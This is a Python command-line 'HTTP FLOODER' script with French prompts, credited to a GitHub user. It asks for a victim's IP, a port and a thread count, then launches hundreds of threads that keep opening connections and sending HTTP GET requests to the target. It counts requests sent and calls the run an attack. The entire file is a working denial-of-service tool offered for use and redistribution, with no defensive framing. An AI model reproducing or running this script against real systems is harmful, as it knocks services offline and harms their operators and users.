import socket
import threading
import sys
import time
from sys import platform
import os

if platform == "linux" or platform == "linux2":
    os.system('clear')
elif platform == "darwin":
    os.system('clear')
elif platform == "win32":
    os.system('CLS')

print("")
print('\033[94m' + " _   _ _____ ___________  ______ _     _____  ___________ ___________ ")
print('\033[94m' + "| | | |_   _|_   _| ___ \ |  ___| |   |  _  ||  _  |  _  \  ___| ___ \ ")
print('\033[94m' + "| |_| | | |   | | | |_/ / | |_  | |   | | | || | | | | | | |__ | |_/ /")
print('\033[94m' + "|  _  | | |   | | |  __/  |  _| | |   | | | || | | | | | |  __||    / ")
print('\033[94m' + "| | | | | |   | | | |     | |   | |___\ \_/ /\ \_/ / |/ /| |___| |\ \ ")
print('\033[94m' + "\_| |_/ \_/   \_/ \_|     \_|   \_____/\___/  \___/|___/ \____/\_| \_|")
print('\033[94m' + "                                                                      ")
print("")
print('\033[95m' + "By @tensh1hx | https://github.com/tensh1hx | You can modify or redistribute the script.")
print("")
print("")

target = input('\033[92m' + "[?] Entrez l'IP de la victime: ")
port = input('\033[92m' + "[?] Entrez un port: ")
threads = input('\033[92m' + "[?] Entrez le nombre de threads à amorcer (342 par exemple): ")
compteur = 0
banned = 0

if threads == '':
    threads = 342

if port == '':
    port = 80

port = int(port)
threads = int(threads)

def attaque():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            request = "GET / HTTP/1.1\r\nHost:%s\r\n\r\n" % target
            request = request.encode()
            s.sendto(request, (target, port))

            global compteur
            print('\033[92m' + "[✓] {} requêtes envoyées avec succès à {}".format(compteur, target))

            compteur += 1
            s.close
        except socket.error:
            print('\033[91m' + "[!] Connexion impossible! L'IP spécifiée ne répond plus.")
            break

for i in range(threads):
        thread = threading.Thread(target=attaque)
        thread.daemon = True
        thread.start()

while True:
    try:
        time.sleep(0.1)
    except KeyboardInterrupt:
        print('\033[91m' + "\n[*] Vous avez décidé d'arrêter l'attaque.")
        print("")
        sys.exit()
